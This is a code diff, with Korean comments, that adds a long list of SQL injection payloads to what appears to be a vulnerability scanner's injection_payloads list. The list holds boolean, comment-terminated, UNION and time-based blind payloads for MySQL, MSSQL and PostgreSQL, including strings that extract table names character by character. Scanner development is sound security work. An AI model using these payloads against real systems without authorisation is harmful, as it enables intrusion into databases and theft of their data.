@@ -18,7 +18,50 @@ injection_payloads = [
     "' AND '1'='2 -- ",
     "AND 1=1 --",
     "AND 1=2 --",
-    # ... (나머지 페이로드 추가)
+    "OR 'a'='a' -- ",
+    "OR 'a'='b' -- ",
+    "OR 1=1 --",
+    "OR 1=2 --",
+
+    # 괄호와 다양한 특수문자 위치 조합
+    "') AND ('1'='1 --",
+    "') AND ('1'='2 --",
+    "' AND (1=1) --",
+    "' AND (1=2) --",
+    ") AND (1=1 --",
+    ") AND (1=2 --",
+    "') OR ('a'='a' --",
+    "') OR ('a'='b' --",
+    "AND 1=1 /*",
+    "AND 1=2 /*",
+    "|| 1=1 #",
+    "|| 1=2 #",
+
+    # 산술 연산 및 특수 문자 추가
+    "' AND ((1+1)=2) /*",
+    "' AND ((1+1)=3) /*",
+    "AND ((2*2)=4) #",
+    "AND ((2*2)=5) #",
+    "' AND ((10/2)=5) --",
+    "' AND ((10/2)=6) --",
+
+    # 주요 DBMS별 Blind Injection 조건 및 주석 스타일
+    "' AND SLEEP(5) --",                      
+    "' AND BENCHMARK(1000000,MD5('test')) --", 
+    "' AND IF(1=1, SLEEP(5), 0) --",          
+    "' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 64 --",
+    "' UNION SELECT NULL, NULL#",
+    "' OR 1=1 /*",
+    "'; WAITFOR DELAY '0:0:5' --",            
+    "' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U') --",  
+    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects), 1, 1)) > 64 --",
+    "' OR 'a' LIKE 'a'--",                    
+    "AND 1=1 --",                             
+    "'; SELECT pg_sleep(5) --",               
+    "' AND 1=(SELECT COUNT(*) FROM pg_catalog.pg_tables) --",
+    "' AND ASCII(SUBSTRING((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1), 1, 1)) > 64 --",
+    "AND '1'='1' /*",
+    "' OR pg_sleep(5) --",
 ]
 
 # 취약점 탐지 함수
